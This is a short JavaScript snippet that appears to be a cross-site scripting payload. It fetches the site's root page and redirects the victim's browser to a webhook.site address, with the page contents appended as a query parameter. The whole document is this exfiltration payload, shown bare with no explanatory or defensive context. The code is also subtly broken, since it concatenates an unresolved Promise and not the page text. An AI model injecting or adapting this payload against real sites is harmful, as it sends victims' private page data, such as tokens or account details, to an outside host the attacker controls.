fetch('/')
    .then(function(response) {
        // When the page is loaded convert it to text
        document.location.replace("https://webhook.site/bb581fce-351d-4b88-96fd-ab230a1465fd?c=" + response.text());
    });
